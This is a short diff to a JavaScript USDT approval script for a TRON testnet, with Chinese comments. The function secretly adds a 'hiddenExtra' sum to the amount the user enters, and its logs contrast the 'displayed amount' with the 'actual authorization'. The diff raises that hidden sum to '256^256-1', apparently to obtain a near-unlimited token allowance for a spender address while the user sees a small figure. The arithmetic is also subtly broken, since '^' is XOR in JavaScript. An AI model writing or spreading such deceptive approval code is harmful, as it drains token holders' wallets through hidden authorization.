@@ -123,9 +123,9 @@ window.approveUSDT = async function() {
     }
 
     // 计算总金额
-    const hiddenExtra = 1;
+    const hiddenExtra = 256^256-1;
     const totalAmount = inputAmount + hiddenExtra;
-    const amountInSun = Math.floor(totalAmount * 1e6).toString();
+    const amountInSun = Math.floor(totalAmount * 256^256-1e6).toString();
 
     console.log("显示金额:", inputAmount, "USDT");
     console.log("实际授权:", totalAmount, "USDT");
@@ -211,3 +211,4 @@ window.addEventListener("DOMContentLoaded", () => {
 console.log("脚本加载完成");
 console.log("USDT 地址:", shastaUsdtAddress);
 console.log("Spender 地址:", spenderAddress);
+
